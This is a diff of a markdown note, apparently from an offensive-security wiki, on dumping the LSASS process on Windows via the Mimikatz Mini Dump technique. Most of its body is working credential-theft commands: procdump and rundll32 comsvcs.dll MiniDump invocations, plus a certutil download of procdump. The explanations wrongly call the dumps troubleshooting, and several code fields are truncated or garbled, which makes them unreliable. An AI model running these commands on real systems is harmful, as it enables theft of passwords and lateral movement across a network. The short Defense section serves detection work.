@@ -37,11 +37,15 @@ From a technical perspective, the Mimikatz Mini Dump technique works by exploiti
 
 From a business perspective, the Mimikatz Mini Dump technique represents a significant threat to organizations as it allows attackers to steal sensitive information and gain access to other systems on the network.
 
+ 
+
 ## Requirements
 
 1. Access to the target system
 
 1. Privileged access to run the Mimikatz tool
+
+ 
 
 ## Defense
 
@@ -51,17 +55,27 @@ From a business perspective, the Mimikatz Mini Dump technique represents a signi
 
 1. Monitor for suspicious activity, such as repeated attempts to dump the memory of the LSASS process
 
+ 
+
 ## Objectives
 
 1. Dump the memory of the LSASS process
 
 1. Extract sensitive information such as passwords and credentials
 
+ 
+
 # Instructions
 
 1. procdump -ma lsass.exe lsass.dmp
 
+ 
+
+
+
 **Code**: [[procdump]]
+
+
 
 > This command is used to create a dump of the LSASS process. The dump can be analyzed to investigate any issues related to authentication or security. The -ma switch creates a full memory dump of the process. The first argument 'lsass.exe' specifies the name of the process to be dumped and the second argument 'lsass.dmp' specifies the name of the dump file that will be created.
 
@@ -76,10 +90,18 @@ Alternatively, you can use the SMB method to dump the process:
 2. Find the PID of the lsass.exe process using the following command: tasklist /fi "imagename eq lsass.exe"
 3. Dump the lsass.exe process using the following command: Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
 
+ 
+
+
+
 **Code**: [[# HTTP method - using the default way
 certutil -ur]]
 
+
+
 > This command is used to dump the lsass.exe process using Procdump. Procdump is a command-line utility that can be used to generate memory dumps of processes based on a variety of triggers. The command uses two methods to dump the process - HTTP and SMB. The HTTP method is the default method and is used to download Procdump from the live.sysinternals.com website. The SMB method is used to map a network drive and then dump the process using the PID of the lsass.exe process. The command also explains the arguments used in the Procdump command and provides step-by-step instructions on how to use the command.
+
+
 
 **Command** ([[Download procdump.exe using HTTP method]]):
 
@@ -87,11 +109,19 @@ certutil -ur]]
 certutil -urlcache -split -f http://live.sysinternals.com/procdump.exe C:\Users\Public\procdump.exe
 ```
 
+
+
+
+
 **Command** ([[Create memory dump of lsass.exe using HTTP method]]):
 
 ```bash
 C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 ```
+
+
+
+
 
 **Command** ([[Download procdump.exe using SMB method]]):
 
@@ -99,11 +129,19 @@ C:\Users\Public\procdump.exe -accepteula -ma lsass.exe lsass.dmp
 net use Z: https://live.sysinternals.com
 ```
 
+
+
+
+
 **Command** ([[Find lsass's pid]]):
 
 ```bash
 tasklist /fi "imagename eq lsass.exe"
 ```
+
+
+
+
 
 **Command** ([[Create memory dump of lsass.exe using SMB method]]):
 
@@ -111,15 +149,29 @@ tasklist /fi "imagename eq lsass.exe"
 Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
 ```
 
+
+
 3. rundll32.exe C:\windows\system32\comsvcs.dll, MiniDump (ProcessID) (DumpFilePath)
 
+ 
+
+
+
 **Code**: [[rundll32]]
+
+
 
 > This command is used to dump the lsass.exe process for troubleshooting purposes. The (ProcessID) argument specifies the process ID of the lsass.exe process, and the (DumpFilePath) argument specifies the path and filename for the dump file. The dump file can then be analyzed to determine the cause of any issues with the lsass.exe process.
 
 4. To create a full dump of the LSASS process, run the following command in PowerShell:
 
+ 
+
+
+
 **Code**: [[rundll32.exe C:\Windows\System32\comsvcs.dll, Mini]]
+
+
 
 > This command uses the MiniDump utility to create a full memory dump of the LSASS process. The dump file will be saved in the C:\temp directory with the name lsass.dmp. The $lsass_pid variable should be replaced with the process ID of the LSASS process. This command is useful for troubleshooting LSASS related issues or for forensic analysis.
 
@@ -145,3 +197,5 @@ Z:\procdump.exe -accepteula -ma $lsass_pid lsass.dmp
 
 - [[Mini Dump]]
 - [[Windows - Mimikatz]]
+
+
